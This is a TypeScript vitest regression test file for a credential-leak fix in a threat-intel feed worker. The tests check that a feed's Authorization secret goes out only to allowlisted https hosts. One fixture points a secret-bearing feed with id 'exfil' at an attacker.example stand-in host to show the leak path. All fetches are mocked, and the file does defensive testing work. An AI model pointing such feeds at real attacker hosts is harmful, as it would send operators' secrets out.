// Copyright (c) 2026 schmug. Licensed under the Apache 2.0 license.

/**
 * Feed-credential destination pin for GHSA-jfj6-w954-96vg (finding f27).
 *
 * `resolveFeeds` attaches `env[f.auth_secret]` as an `Authorization` header
 * on the feed refresh fetch. The `FEED_SECRET_` prefix guard (#418)
 * constrains WHICH secret may be named, but the destination `f.url` is
 * teammate-editable settings data — without a host pin, a feed pointed at
 * `https://attacker.example` receives the raw secret.
 *
 * Pin: the Authorization header is only attached when the feed URL's host
 * is on `FEED_ALLOWED_HOSTS` (CSV) UNION the hostnames of the built-in
 * `DEFAULT_FEEDS` (so operator-trusted default secret-bearing feeds keep
 * working with no new config), and the URL is https. An off-allowlist feed
 * still fetches — public no-secret feeds are never blocked — it just never
 * carries the credential.
 *
 * Exercised through `refreshAllFeeds` (the real fetch path) with a mocked
 * `globalThis.fetch`, so the assertion is on the headers that actually
 * leave the worker.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { refreshAllFeeds } from "../../workers/intel/feeds";
import { DEFAULT_FEEDS } from "../../workers/intel/defaults";
import { clearOrgSettingsCache } from "../../workers/lib/org-settings";
import { clearDomainSettingsCache } from "../../workers/lib/domain-settings";
import type { Env } from "../../workers/types";

const MAILBOX_ID = "user@example.com";

// ── Fakes ─────────────────────────────────────────────────────────────

function makeKv() {
	const store = new Map<string, string>();
	return {
		store,
		async get(key: string) {
			return store.get(key) ?? null;
		},
		async put(key: string, value: string) {
			store.set(key, value);
		},
	};
}

/** R2 fake routing by key: one mailbox listed, mailbox settings JSON served,
 *  org/domain tiers absent. */
function makeBucket(mailboxSettings: unknown) {
	return {
		async list(_opts: { prefix: string }) {
			return { objects: [{ key: `mailboxes/${MAILBOX_ID}.json` }] };
		},
		async get(key: string) {
			if (key !== `mailboxes/${MAILBOX_ID}.json`) return null;
			return {
				etag: "etag-1",
				async json() {
					return mailboxSettings;
				},
			};
		},
	};
}

function makeMailboxStub() {
	return {
		async getIntelFeedState(_feedId: string) {
			return null;
		},
		async upsertIntelFeedState(_feedId: string, _state: unknown) {},
	};
}

function makeEnv(opts: {
	mailboxSettings: unknown;
	feedAllowedHosts?: string;
	secrets?: Record<string, string>;
}): Env {
	const stub = makeMailboxStub();
	const mailboxNs = {
		idFromName(name: string) {
			return { toString: () => name } as unknown as DurableObjectId;
		},
		get(_id: DurableObjectId) {
			return stub as unknown as DurableObjectStub;
		},
	} as unknown as DurableObjectNamespace;
	return {
		BLOOM_KV: makeKv() as unknown as KVNamespace,
		BUCKET: makeBucket(opts.mailboxSettings) as unknown as R2Bucket,
		MAILBOX: mailboxNs,
		FEED_ALLOWED_HOSTS: opts.feedAllowedHosts,
		...(opts.secrets ?? {}),
	} as unknown as Env;
}

/** Capture every fetch the refresh makes; serve an empty 200 domain list. */
function mockFetch() {
	const calls: Array<{ url: string; headers: Record<string, string> }> = [];
	const fn = vi.fn(async (input: string | URL | Request, init?: RequestInit) => {
		const url = typeof input === "string" ? input : input.toString();
		const headers = { ...((init?.headers as Record<string, string>) ?? {}) };
		calls.push({ url, headers });
		return new Response("# empty feed\n", { status: 200 });
	});
	globalThis.fetch = fn as unknown as typeof fetch;
	return calls;
}

function callsToHost(
	calls: Array<{ url: string; headers: Record<string, string> }>,
	hostname: string,
) {
	// Parse and compare hostname — never substring-match URLs (CodeQL
	// js/incomplete-url-substring-sanitization).
	return calls.filter((c) => new URL(c.url).hostname === hostname);
}

let originalFetch: typeof fetch;

beforeEach(() => {
	originalFetch = globalThis.fetch;
	clearOrgSettingsCache();
	clearDomainSettingsCache();
});

afterEach(() => {
	globalThis.fetch = originalFetch;
	vi.restoreAllMocks();
});

// ── Tests ─────────────────────────────────────────────────────────────

describe("feed Authorization host pin (GHSA-jfj6-w954-96vg f27)", () => {
	it("does NOT attach the FEED_SECRET_ Authorization header when the feed host is off-allowlist", async () => {
		const calls = mockFetch();
		const env = makeEnv({
			mailboxSettings: {
				intel: {
					feeds: [
						{
							id: "exfil",
							url: "https://attacker.example/collect.txt",
							kind: "domain",
							auth_secret: "FEED_SECRET_CROWDSEC",
						},
					],
				},
			},
			feedAllowedHosts: "feeds.trusted.example",
			secrets: { FEED_SECRET_CROWDSEC: "super-secret-key" },
		});

		await refreshAllFeeds(env);

		const hit = callsToHost(calls, "attacker.example");
		// The fetch itself still proceeds (public feeds are never blocked)…
		expect(hit.length).toBe(1);
		// …but the credential must not ride along.
		expect(hit[0].headers["Authorization"]).toBeUndefined();
	});

	it("attaches the Authorization header for a host on FEED_ALLOWED_HOSTS", async () => {
		const calls = mockFetch();
		const env = makeEnv({
			mailboxSettings: {
				intel: {
					feeds: [
						{
							id: "trusted",
							url: "https://feeds.trusted.example/list.txt",
							kind: "domain",
							auth_secret: "FEED_SECRET_CROWDSEC",
						},
					],
				},
			},
			feedAllowedHosts: "feeds.trusted.example",
			secrets: { FEED_SECRET_CROWDSEC: "super-secret-key" },
		});

		await refreshAllFeeds(env);

		const hit = callsToHost(calls, "feeds.trusted.example");
		expect(hit.length).toBe(1);
		expect(hit[0].headers["Authorization"]).toBe("super-secret-key");
	});

	it("attaches the Authorization header for a built-in DEFAULT_FEEDS host with no FEED_ALLOWED_HOSTS config", async () => {
		// Pick a real default-feed host so the union keeps operator-trusted
		// defaults working with zero new config.
		const defaultUrl = DEFAULT_FEEDS.find((f) => f.url)!.url;
		const defaultHost = new URL(defaultUrl).hostname;
		const calls = mockFetch();
		const env = makeEnv({
			mailboxSettings: {
				intel: {
					feeds: [
						{
							id: "default-override",
							url: defaultUrl,
							kind: "domain",
							auth_secret: "FEED_SECRET_DEFAULT",
						},
					],
				},
			},
			// Deliberately no FEED_ALLOWED_HOSTS.
			secrets: { FEED_SECRET_DEFAULT: "default-feed-key" },
		});

		await refreshAllFeeds(env);

		const hit = callsToHost(calls, defaultHost);
		expect(hit.length).toBe(1);
		expect(hit[0].headers["Authorization"]).toBe("default-feed-key");
	});

	it("does NOT attach the Authorization header for a non-https feed URL even when the host is allowlisted", async () => {
		const calls = mockFetch();
		const env = makeEnv({
			mailboxSettings: {
				intel: {
					feeds: [
						{
							id: "plaintext",
							url: "http://feeds.trusted.example/list.txt",
							kind: "domain",
							auth_secret: "FEED_SECRET_CROWDSEC",
						},
					],
				},
			},
			feedAllowedHosts: "feeds.trusted.example",
			secrets: { FEED_SECRET_CROWDSEC: "super-secret-key" },
		});

		await refreshAllFeeds(env);

		const hit = callsToHost(calls, "feeds.trusted.example");
		expect(hit.length).toBe(1);
		expect(hit[0].headers["Authorization"]).toBeUndefined();
	});

	it("public no-secret feeds still resolve and fetch regardless of the allowlist", async () => {
		const calls = mockFetch();
		const env = makeEnv({
			mailboxSettings: {
				intel: {
					feeds: [
						{
							id: "public",
							url: "https://public.lists.example/feed.txt",
							kind: "domain",
						},
					],
				},
			},
			// No allowlist, no secrets.
		});

		const result = await refreshAllFeeds(env);

		const hit = callsToHost(calls, "public.lists.example");
		expect(hit.length).toBe(1);
		expect(hit[0].headers["Authorization"]).toBeUndefined();
		expect(result.feeds).toBe(1);
	});

	it("default feeds (no per-mailbox feeds configured) still refresh without Authorization headers", async () => {
		const calls = mockFetch();
		const env = makeEnv({ mailboxSettings: {} });

		const result = await refreshAllFeeds(env);

		// Every non-placeholder default feed is fetched, none carry credentials.
		const expected = DEFAULT_FEEDS.filter((f) => f.url).length;
		expect(result.feeds).toBe(expected);
		for (const call of calls) {
			expect(call.headers["Authorization"]).toBeUndefined();
		}
	});
});
